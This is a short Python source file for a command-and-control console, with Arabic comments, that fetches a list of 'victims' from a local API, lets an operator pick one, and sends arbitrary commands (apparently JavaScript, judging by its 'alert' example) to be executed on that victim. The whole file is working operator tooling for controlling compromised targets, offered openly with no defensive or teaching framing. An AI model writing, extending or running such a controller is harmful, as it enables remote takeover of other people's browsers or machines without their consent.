import cmd
import requests
import json
import os

API_URL = "http://localhost:5000/api"
SELECTED_VICTIM = None
VICTIM_LIST = []  # نخزن فيها الـ UUID لكل ضحية

class C2CLI(cmd.Cmd):
    intro = "Advanced C2 CLI - Type 'help' for commands"
    prompt = "C2> "

    def do_list(self, arg):
        """List all victims"""
        global VICTIM_LIST
        try:
            r = requests.get(f"{API_URL}/victims")
            victims = r.json()
            VICTIM_LIST = victims  # نخزن القائمة كاملة

            print("\nNo.  ID                                  Status    Last Seen")
            print("-" * 75)
            for i, v in enumerate(victims, start=1):
                print(f"{i:<5}{v['id']:<36}{v['status']:<10}{v['last_seen']}")
            print()
        except Exception as e:
            print(f"✗ Failed to fetch victims: {e}")

    def do_use(self, arg):
        """Select a victim by number: use 1"""
        global SELECTED_VICTIM
        try:
            index = int(arg) - 1
            if index < 0 or index >= len(VICTIM_LIST):
                print("✗ Invalid victim number.")
                return
            SELECTED_VICTIM = VICTIM_LIST[index]['id']  # نخزن UUID
            print(f"✓ Selected victim {SELECTED_VICTIM}")
        except ValueError:
            print("✗ Please provide a valid number.")
        except Exception as e:
            print(f"✗ Error: {e}")

    def do_cmd(self, arg):
        """Send a command to selected victim: cmd alert('hi')"""
        global SELECTED_VICTIM
        if not SELECTED_VICTIM:
            print("✗ No victim selected. Use 'use <number>' first.")
            return
        try:
            data = {"victim": SELECTED_VICTIM, "command": arg}
            r = requests.post(f"{API_URL}/execute", json=data)
            if r.status_code == 200:
                try:
                    print(r.json())
                except:
                    print("✓ Command sent successfully.")
            else:
                print(f"✗ Server returned status: {r.status_code}")
        except Exception as e:
            print(f"✗ Failed to send command: {e}")

    def do_exit(self, arg):
        """Exit the CLI"""
        return True

if __name__ == "__main__":
    C2CLI().cmdloop()
